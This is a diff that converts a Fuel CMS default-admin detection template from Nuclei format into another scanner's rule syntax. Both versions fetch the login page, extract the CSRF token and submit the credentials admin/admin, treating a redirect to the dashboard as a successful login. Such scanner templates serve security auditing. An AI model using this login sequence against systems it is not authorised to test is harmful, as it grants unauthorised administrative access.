@@ -4,58 +4,30 @@ info:
   name: Fuel CMS - Default Admin Discovery
   author: Adam Crosser
   severity: high
-  description: Fuel CMS default admin credentials were discovered.
+  verified: false
+  description: |-
+    Fuel CMS default admin credentials were discovered.
   reference:
     - https://docs.getfuelcms.com/general/security
-  classification:
-    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
-    cvss-score: 8.3
-    cwe-id: CWE-522
-  metadata:
-    max-request: 2
-  tags: fuelcms,default-login,oss,vuln
+  tags: fuelcms,default-login,oss
+  created: 2023/06/24
 
-http:
-  - raw:
-      - |
-        GET /fuel/login HTTP/1.1
-        Host: {{Hostname}}
-      - |
-        POST /fuel/login HTTP/1.1
-        Host: {{Hostname}}
-        Content-Type: application/x-www-form-urlencoded
-
-        user_name={{username}}&password={{password}}&Login=Login&forward=&ci_csrf_token_FUEL={{csrftoken}}
-
-    attack: pitchfork
-    payloads:
-      username:
-        - admin
-      password:
-        - admin
-
-    matchers-condition: and
-    matchers:
-      - type: word
-        part: header
-        words:
-          - "/fuel/dashboard"
-
-      - type: regex
-        part: header
-        regex:
-          - 'fuel_(.*)='
-
-      - type: status
-        status:
-          - 302
-
-    extractors:
-      - type: regex
-        part: body
-        name: csrftoken
-        internal: true
-        group: 1
-        regex:
-          - 'id="ci_csrf_token_FUEL" value="([0-9a-z]+)" \/>'
-# digest: 4b0a00483046022100cfe3bd4fd3774f989a40bb9426310b400c9190367046602ddac4a555b63fd22d022100b2b705285876915a3921efb635f38fc91a0c7682698ee184426f26159481d8ce:922c64590222798bb761d5b6d8e72950
+rules:
+  r0:
+    request:
+      method: GET
+      path: /fuel/login
+    expression: response.body.bcontains(b'id="ci_csrf_token_FUEL"')
+    output:
+      search: '"id=\"ci_csrf_token_FUEL\" value=\"(?P<csrftoken>.+?)\"".bsubmatch(response.body)'
+      csrftoken: search["csrftoken"]
+  r1:
+    request:
+      method: POST
+      path: /fuel/login
+      body: |
+        user_name=admin&password=admin&Login=Login&forward=&ci_csrf_token_FUEL={{csrftoken}}
+    expression: |
+      response.status == 302 && 
+      response.raw_header.bcontains(b'/fuel/dashboard')
+expression: r0() && r1()
